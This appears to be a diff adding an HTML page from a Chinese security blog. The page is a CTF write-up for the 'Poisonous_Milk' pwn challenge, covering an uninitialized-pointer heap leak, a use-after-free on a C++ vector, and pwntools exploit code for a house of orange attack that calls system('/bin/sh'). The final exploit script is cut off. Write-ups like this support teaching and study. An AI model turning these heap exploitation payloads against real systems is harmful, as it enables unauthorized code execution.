@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，我们检查一下程序的保护机制   然后，我们用IDA分析一下，发现是c++写的程序，看起来复杂了很多，这些一大堆，作用只是打印菜单，那么我们把这个函数重命名为menu。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Poisonous_Milk(认清vector的结构+house of orange利用)">
+<meta property="og:url" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，我们检查一下程序的保护机制   然后，我们用IDA分析一下，发现是c++写的程序，看起来复杂了很多，这些一大堆，作用只是打印菜单，那么我们把这个函数重命名为menu。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image14.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image15.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image16.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image17.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image18.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image19.JPG">
+<meta property="article:published_time" content="2020-02-19T06:34:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T13:00:38.625Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="C++ vector">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="未初始化漏洞">
+<meta property="article:tag" content="house of orange">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Poisonous_Milk(认清vector的结构+house of orange利用) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/02/19/Poisonous_Milk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Poisonous_Milk(认清vector的结构+house of orange利用)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-19 14:34:50" itemprop="dateCreated datePublished" datetime="2020-02-19T14:34:50+08:00">2020-02-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 21:00:38" itemprop="dateModified" datetime="2025-06-21T21:00:38+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，我们检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image1.JPG" class="">
+
+<p>然后，我们用IDA分析一下，发现是c++写的程序，看起来复杂了很多，这些一大堆，作用只是打印菜单，那么我们把这个函数重命名为menu。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image2.JPG" class="">
+
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image3.JPG" class="">
+
+<p>接下来，我们进入下一个函数查看，应该就是主功能区了。</p>
+<p>为了便于分析，我们给函数重命名了</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image4.JPG" class="">
+
+<p>创建内容的函数里，最多输入86个字符</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image5.JPG" class="">
+
+<p>实际上只能输入85个字符，并且最后一个会被设置为0</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image6.JPG" class="">
+
+<p>接下来，是创建结构体</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image7.JPG" class="">
+
+<p>经过分析，这个结构体这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">milk</span> &#123;</span>  </span><br><span class="line">   <span class="type">char</span> *color;  </span><br><span class="line">   <span class="type">char</span> *content;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>但是，这里初始color时，存在一个漏洞</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image8.JPG" class="">
+
+<p><strong>[如果我们输入的color不存在，那么结构体里的color指针就不会初始化]{.mark}</strong>，它的值就是其他的值。如果把这个结构体释放后再重新申请回来，如果color不存在，那么color指针就会保存着堆地址。因为这个位置正好对应fastbin的fd。这样，我们就可以泄露堆地址。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image9.JPG" class="">
+
+<p>现在，<strong>[我们要弄清楚这个qword_203160到底是什么？]{.mark}</strong></p>
+<p>我们发现这个函数极其复杂</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image10.JPG" class="">
+
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image11.JPG" class="">
+
+<p>先放着，继续分析。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image12.JPG" class="">
+
+<p>推测这玩意儿，应该是一个vector。我们来看看c++的vector的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">template&lt;<span class="class"><span class="keyword">class</span> _<span class="title">Ty</span>,  </span></span><br><span class="line"><span class="class">    <span class="keyword">class</span> _<span class="title">Ax</span>&gt;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vector</span>  </span></span><br><span class="line"><span class="class">        :</span> public _Vector_val&lt;_Ty, _Ax&gt;  </span><br><span class="line">    &#123;   <span class="comment">// varying size array of values  </span></span><br><span class="line">public:  </span><br><span class="line">    <span class="comment">/********/</span>  </span><br><span class="line">protected:  </span><br><span class="line">    pointer _Myfirst;   <span class="comment">// pointer to beginning of array  </span></span><br><span class="line">    pointer _Mylast;    <span class="comment">// pointer to current end of sequence  </span></span><br><span class="line">    pointer _Myend; <span class="comment">// pointer to end of array  </span></span><br><span class="line">    &#125;;  </span><br></pre></td></tr></table></figure>
+
+<p>那么，我们现在可以确定，这个qword_203160就是一个vector了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vector</span> &#123;</span>  </span><br><span class="line">   <span class="type">void</span> *start;  </span><br><span class="line">   <span class="type">void</span> *end;  </span><br><span class="line">   <span class="type">void</span> *capacity;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>为了方便，我们在IDA里重命名一下，现在我们看的清楚了，那个复杂的函数是vector的扩容操作，不用管。每次新增后,插入到end指针的位置，然后end指针向后偏移8字节。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image13.JPG" class="">
+
+<p>分析后，我们知道了，程序中的存储结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存储结构  </span></span><br><span class="line"><span class="built_in">vector</span>&lt;milk *&gt; milks;  </span><br></pre></td></tr></table></figure>
+
+<p>然后，我们继续分析，显示功能也没什么漏洞</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image14.JPG" class="">
+
+<p>Delete节点功能，删除一个节点后,vector的end指针做了相应的调整，那么end没有指向释放后的指针，虽然没有清空指针，也用不了UAF。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image15.JPG" class="">
+
+<p>然后，我们看释放所有节点，以及vector对象本身的函数</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image16.JPG" class="">
+
+<p>注意到，释放vector后，没有把vector指针清零，又因为vector指针是放在bss段，是一个全局变量，其他函数可以使用，这意味着，<strong>[这个vector本身可以存着UAF漏洞。]{.mark}<strong>那么，我们把vector的内存申请回来，就能</strong>[控制vector里的begin、end、capacity三个指针]{.mark}</strong>，并且，我们把这些指针指向我们可以控制的区域，然后在可以控制的区域，布置下我们需要读写的地址，这样，我们就能实现任意地址读写操作。但是由于本程序没有edit功能，也就没有写，但是，我们可以伪造chunk，实现任意的free操作。从而利用。</p>
+<p>那么，我们就开始攻击吧，首先泄露堆地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个0x20的头结构体加0x20的存储flags的堆，这样，两个堆释放和属于同一个fastbin，并且头结构体作为头，因为后释放  </span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">1</span>))  </span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#接下来重新申请堆，之前的节点结构体内保存着指针，由于flags堆先申请，所以我们不能申请和之前大小一样的  </span></span><br><span class="line"><span class="comment">#因为我们要让我们这个节点的结构体申请到前一个释放后的节点的结构体内存位置处  </span></span><br><span class="line">create(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line"><span class="comment">#泄露堆地址  </span></span><br><span class="line">show()  </span><br></pre></td></tr></table></figure>
+
+<p>由于创建时，大小受限制，我们创建不了unsorted bin访问的chunk，因此，我们需要来伪造unsorted bin chunk，然后利用控制vector的begin、end指针，在可控区域布下一个指针指向我们伪造的节点。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#释放了所有的堆，以及vector对象本身  </span></span><br><span class="line">drink()  </span><br><span class="line"><span class="comment">#重新申请到了vector的内存空间，UAF控制vector的begin和end指针  </span></span><br><span class="line">create(p64(heap_base + <span class="number">0xE50</span>) + p64(heap_base + <span class="number">0xE58</span>))  </span><br><span class="line"><span class="comment">#这里是用来创建0x20大小的堆，放入fastbin，给以后申请用，这样申请节点结构体时，就不会从我们辛苦得到的unsorted bin里切割  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):  </span><br><span class="line">   create(<span class="string">&#x27;g&#x27;</span>*<span class="number">0x9</span>) <span class="comment">#index 2~3  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">1</span>,-<span class="number">1</span>):  </span><br><span class="line">   delete(i)  </span><br></pre></td></tr></table></figure>
+
+<p>需要注意的一点是，我们提前创建了2个content大小为0x20的节点，然后释放，也就是说，在**[0x20的fastbin里有四个chunk，可以提供给后面的申请使用]{.mark}<strong>。并且我们是先drink释放了vector，然后才创建的。而不能先创建再drink，因为drink里面，会将我们放到0x20 fastbin的chunk给用掉(调试的时候发现)。之所以在前面先弄几个0x20的fastbin，</strong>[一方面，是为了缩短content与content之间的间隙，方便我们控制]{.mark}<strong>，因为如果不这样，节点milk结构体会夹在content与content之间，不方便我们后面的控制。</strong>[另一方面，是避免申请堆时，从我们辛苦得到的unsorted bin里切割。]{.mark}**</p>
+<p>上面第二句代码，我们控制了vector的begin和end指针，但是为了不保证出错，我们要确保create时，<strong>[这个expand扩容操作，不要超过我们begin指针指向的那个位置所属堆的大小，不然扩容到后面的区域我们不可控]{.mark}</strong>。导致show的时候出错，因为后面可能有无效地址。</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image17.JPG" class="">
+
+<p>比如我们的begin指针指向了heap_base+0xE50处，而**[heap_base+0xE50是我们待会申请的某个堆的地址，这个堆，我们最大申请0x60字节，最多写入85个字节，也就是我们最多可以在此处放8个节点指针。]{.mark}**扩容超出后，后面的内容我们控制不了，这样show时会导致出错。</p>
+<p>这意味着，接下来的操作，我们在没有delete堆前的create操作，最多8次。这完全够用了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==============为了得到unsorted bin的chunk，我们伪造三个chunk===========  </span></span><br><span class="line"><span class="comment">#伪造节点结构体  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)  </span><br><span class="line"><span class="comment">#color_ptr          #flags_ptr  </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(heap_base+<span class="number">0xCD0</span>)  </span><br><span class="line"><span class="comment">#伪造flags堆  </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#index2  </span></span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;b&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#index3  </span></span><br><span class="line"><span class="comment">#payload = &#x27;c&#x27;*0x10  </span></span><br><span class="line"><span class="comment">#在后面继续伪造两个堆，绕过堆检查  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)  </span><br><span class="line">payload += <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#2  </span></span><br></pre></td></tr></table></figure>
+
+<p>现在堆伪造好了，我们要释放它，之前我们控制vector的begin指针**[heap_base+0xE50，]{.mark}**</p>
+<p>因此，我们在**[heap_base+0xE50]{.mark}<strong>处</strong>[放置伪造的节点的地址。]{.mark}**当然，还要把其他申请过的节点的地址放过来，这样，我们后续才能继续控制。</p>
+<p>而通过精心布局，我们接下来申请一个堆，地址就找heap_base+0xE50处，我们就在这里写入几个节点的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==================================================================  </span></span><br><span class="line"><span class="comment">#这个堆，我们用来伪造vector的每一项的指针item*，通过控制item*指针，我们就对对需要的节点进行操作  </span></span><br><span class="line"><span class="comment">#伪造item指针  </span></span><br><span class="line"><span class="comment">#0  </span></span><br><span class="line">payload = p64(heap_base+<span class="number">0xCB0</span>) <span class="comment">#fake_chunk node  </span></span><br><span class="line"><span class="comment">#1  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xCB0</span>) <span class="comment">#fake_chunk node  </span></span><br><span class="line"><span class="comment">#2  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xC60</span>) <span class="comment">#aaaaaaaaaa node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD10</span>)   <span class="comment">#bbbbbbbbb node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD70</span>)   <span class="comment">#ccccccccc node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD10</span>)   <span class="comment">#  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD70</span>)     <span class="comment">#  </span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#5  </span></span><br></pre></td></tr></table></figure>
+
+<p>我们在0和1处放置了一模一样的的fake_chunk地址，这样第一次我们delete(0)后，后面的内容上移动，那么我们继续show(0)，显示的还是fake_chunk处的内容，这样，我们就能实现UAF。</p>
+<p>接下来重点来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin与我们伪造生成的unsorted bin重合！！  </span></span><br><span class="line">delete(<span class="number">3</span>)  </span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line">delete(<span class="number">1</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>我们来看看bins的布局</p>
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image18.JPG" class="">
+
+<p>因为fastbin和unsorted bin里有重合，我们将fastbin的几个chunk申请回来，就能控制unsorted bin里面的内容。这样，我们就能利用house of orange思想来getshell。并且，上面有好几个0x20的bins，用于提供给Milk结构体，而不会从unsorted bin里切割。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#house of orange  </span></span><br><span class="line"><span class="comment">#fake分成2部分，写入  </span></span><br><span class="line"><span class="comment">#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  </span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#size作为0x60，被放入small_bin，从而对应了chain指针  </span></span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr  </span></span><br><span class="line"><span class="comment">#fake_file += p64(0) + p64(1)  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + fake_file  </span><br><span class="line">create(payload.ljust(<span class="number">0x40</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#第二部分  </span></span><br><span class="line"><span class="comment">##vtable指针,同时，也作为fake_vtable的__dummy  </span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xD98</span>)  </span><br><span class="line"><span class="comment">#__dummy2、__finish  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span>  </span><br><span class="line"><span class="comment">#__overflow  </span></span><br><span class="line">fake_file += p64(system_addr)  </span><br><span class="line">create(fake_file.ljust(<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your flags (0-99):&#x27;</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>)  </span><br></pre></td></tr></table></figure>
+
+<img src="/ha1vk/2020/02/19/Poisonous_Milk/image19.JPG" class="">
+
+<p>如果getshell失败，可以多试几次，这是由于栈环境的问题。</p>
+<p>综上，我们的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 